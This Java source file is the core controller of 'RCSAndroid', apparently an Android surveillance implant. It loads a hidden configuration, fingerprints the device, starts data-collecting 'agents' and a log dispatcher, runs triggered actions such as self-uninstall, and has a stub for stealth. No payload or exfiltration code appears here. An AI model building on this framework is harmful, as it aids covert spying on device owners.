/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.res.Resources;
import android.util.Log;

import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.action.SubAction;
import com.ht.RCSAndroidGUI.action.UninstallAction;
import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.event.EventManager;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class CoreThread.
 */
public class Core extends Activity implements Runnable {

	/** The Constant SLEEPING_TIME. */
	private static final int SLEEPING_TIME = 1000;
	private static final String TAG = "Core";

	/** The b stop core. */
	private boolean bStopCore = false;

	/** The resources. */
	private Resources resources;

	/** The core thread. */
	private Thread coreThread;

	/** The content resolver. */
	private ContentResolver contentResolver;

	/** The agent manager. */
	private AgentManager agentManager;

	/** The event manager. */
	private EventManager eventManager;

	/** The action thread. */
	Thread actionThread;

	/**
	 * Start.
	 * 
	 * @param r
	 *            the r
	 * @param cr
	 *            the cr
	 * @return true, if successful
	 */
	public boolean Start(final Resources r, final ContentResolver cr) {
		coreThread = new Thread(this);
		agentManager = AgentManager.self();
		eventManager = EventManager.self();

		resources = r;
		contentResolver = cr;

		Check.asserts(resources != null, "Null Resources");

		coreThread.start();
		return true;
	}

	/**
	 * Stop.
	 * 
	 * @return true, if successful
	 */
	public boolean Stop() {
		bStopCore = true;
		Log.d(TAG, "RCS Thread Stopped");
		return true;
	}

	// Runnable (main routine for RCS)
	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		Log.d(TAG, "RCS Thread Started");

		stealth();
		try {
			for (;;) {
				Log.i(TAG,"init task");
				if (taskInit() == false) {
					Log.e(TAG,"TaskInit() FAILED");
					break;
				} else {
					Log.d(TAG,"TaskInit() OK");
					// CHECK: Status o init?
				}
				Status.self().setRestarting(false);
				Log.i(TAG,"starting checking actions");
				if (checkActions() == false) {
					Log.e(TAG,"CheckActions() wants to exit");
					// chiudere tutti i thread
					break;
				} else {
					Log.i(TAG,"Waiting a while before reloading");
					Utils.sleep(2000);
				}
			}
		} catch (final Exception ex) {
			Log.e(TAG,"run " + ex);
		} finally {
			Log.d(TAG,"RCSAndroid exit ");
			Utils.sleep(2000);
			System.exit(0);
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 * 
	 * @return true, if successful
	 */
	private boolean checkActions() {
		final Status status = Status.self();

		Utils.sleep(1000);

		try {
			for (;;) {
				Log.d(TAG,"checkActions");
				final int[] actionIds = status.getTriggeredActions();

				final int asize = actionIds.length;
				if (asize > 0) {

					for (int k = 0; k < asize; ++k) {
						final int actionId = actionIds[k];

						final Action action = status.getAction(actionId);
						final int exitValue = executeAction(action);

						if (exitValue == 1) {
							Log.i(TAG,"checkActions: Uninstall");
							UninstallAction.actualExecute();
							return false;
						} else if (exitValue == 2) {
							Log.d(TAG,"checkActions: want Reload");
							return true;
						}
					}
				}

				Utils.sleep(SLEEPING_TIME);
			}
		} catch (final Throwable ex) {
			// catching trowable should break the debugger anc log the full
			// stack trace
			Log.wtf(TAG,"checkActions error, restart: " + ex);
			return true;
		}
	}

	/**
	 * Inizializza il core.
	 * 
	 * @return false if any fatal error
	 */
	private boolean taskInit() {
		try {
			Path.makeDirs();

			// Identify the device uniquely
			final Device device = Device.self();

			if (!loadConf()) {
				Log.e(TAG,"Cannot load conf");
				return false;
			}

			// Start log dispatcher
			final LogDispatcher logDispatcher = LogDispatcher.self();
			if (!logDispatcher.isAlive()) {
				logDispatcher.start();
			}

			// Da qui in poi inizia la concorrenza dei thread

			if (eventManager.startAll() == false) {
				Log.d(TAG,"eventManager FAILED");
				return false;
			}
			Log.i(TAG,"Events started");
			if (agentManager.startAll() == false) {
				Log.d(TAG,"agentManager FAILED");
				return false;
			}
			Log.i(TAG,"Agents started");

			Log.d(TAG, "Core initialized");
			return true;

		} catch (final RCSException rcse) {
			rcse.printStackTrace();
			Log.d(TAG, "RCSException() detected");
		} catch (final Exception e) {
			e.printStackTrace();
			Log.d(TAG, "Exception() detected");
		}

		return false;

	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource
	 * conf.
	 * 
	 * @return false if no correct conf available
	 * @throws RCSException
	 *             the rCS exception
	 */
	public boolean loadConf() throws RCSException {

		boolean loaded = false;

		// tries to load the file got from the sync, if any.
		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
		if (file.exists()) {
			final byte[] resource = file.read(8);
			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.LoadConfiguration();

			Log.i(TAG,"Conf file loaded: " + loaded);
			if (!loaded) {
				file.delete();
			}
		}

		// tries to load the resource conf
		if (!loaded) {

			// Open conf from resources and load it into resource
			final byte[] resource = Utils.InputStreamToBuffer(resources
					.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.LoadConfiguration();

			Log.i(TAG,"Resource file loaded: " + loaded);
		}

		return loaded;
	}

	/**
	 * Stealth.
	 */
	private void stealth() {
		// TODO Auto-generated method stub

	}

	/**
	 * Test run.
	 */
	public void testRun() {
		try {

			final byte[] resource = Utils.InputStreamToBuffer(resources
					.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Identify the device uniquely
			final Device device = Device.self();

			// Load the configuration
			conf.LoadConfiguration();

			// Start log dispatcher
			final LogDispatcher logDispatcher = LogDispatcher.self();
			logDispatcher.start();

			// Start agents
			agentManager.startAll();
			Utils.sleep(2000);
			/*
			 * agentManager.stopAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
			 * agentManager.startAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
			 * agentManager.restartAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
			 */
			// Stop agents
			agentManager.stopAll();
			Utils.sleep(2000);

			final Status status = Status.self();
			status.triggerAction(0);
			final int[] actionIds = status.getTriggeredActions();
			final int asize = actionIds.length;
			if (asize > 0) {
				for (int k = 0; k < asize; ++k) {
					final int actionId = actionIds[k];
					final Action action = status.getAction(actionId);
					final int exitValue = executeAction(action);

					if (exitValue == 1) {
						// Log.i(TAG,"checkActions: Uninstall");
						// UninstallAction.actualExecute();
						// return false;
					} else if (exitValue == 2) {
						// Log.d(TAG,"checkActions: want Reload");
						// return true;
					}
				}
			}

			// Ci stiamo chiudendo
			logDispatcher.halt();
			logDispatcher.join();

			Log.d(TAG, "LogDispatcher Killed");

		} catch (final RCSException rcse) {
			rcse.printStackTrace();
			Log.d(TAG, "RCSException() detected");
		} catch (final Exception e) {
			e.printStackTrace();
			Log.d(TAG, "Exception() detected");
		}

		Log.d(TAG, "Exiting core");
		return;

	}

	/**
	 * Execute action.
	 * 
	 * @param action
	 *            the action
	 * @return the int
	 */
	private int executeAction(final Action action) {
		int exit = 0;
		Log.d(TAG,"CheckActions() triggered: " + action);
		final Status status = Status.self();
		status.unTriggerAction(action);
		// action.setTriggered(false, null);

		status.synced = false;
		// final Vector subActions = action.getSubActionsList();
		final int ssize = action.getSubActionsNum();
		Log.d(TAG,"checkActions, " + ssize + " subactions");
		for (int j = 0; j < ssize; ++j) {
			try {
				final SubAction subAction = action.getSubAction(j);
				Check.asserts(subAction != null,
						"checkActions: subAction!=null");
				// lastSubAction = subAction.toString();

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */
				Log.i(TAG,"CheckActions() executing subaction (" + (j + 1)
						+ "/" + ssize + ") : " + action);
				// no callingEvent
				subAction.prepareExecute();
				actionThread = new Thread(subAction);
				actionThread.start();

				synchronized (subAction) {
					Log.d(TAG,"CheckActions() wait");
					if (!subAction.isFinished()) {
						// il wait viene chiamato solo se la start non e' gia'
						// finita
						subAction.wait(Configuration.TASK_ACTION_TIMEOUT);
					}
				}

				boolean ret = true;

				if (!subAction.isFinished()) {
					ret = false;
					actionThread.interrupt();
					Log.d(TAG,"CheckActions() interrupted thread");
				}
				Log.d(TAG,"CheckActions() waited");
				if (subAction.wantUninstall()) {
					Log.w(TAG,"CheckActions() uninstalling");
					exit = 1;
					break;
					// return false;
				}

				if (subAction.wantReload()) {
					status.setRestarting(true);
					Log.w(TAG,"checkActions: reloading");
					status.unTriggerAll();
					Log.d(TAG,"checkActions: stopping agents");
					agentManager.stopAll();
					Log.d(TAG,"checkActions: stopping events");
					eventManager.stopAll();
					Utils.sleep(2000);
					Log.d(TAG,"checkActions: untrigger all");
					status.unTriggerAll();
					// return true;
					exit = 2;
					break;

				}

				if (ret == false) {
					Log.w(TAG,"CheckActions() error executing: " + subAction);
					continue;
				}
			} catch (final Exception ex) {
				Log.e(TAG,"checkActions for: " + ex);
			}
		}

		return exit;
	}

	/**
	 * Inits the.
	 * 
	 * @return true, if successful
	 */
	public boolean Init() {
		return false;
	}

	/**
	 * Run.
	 * 
	 * @return true, if successful
	 */
	public boolean Run() {
		return false;
	}
}
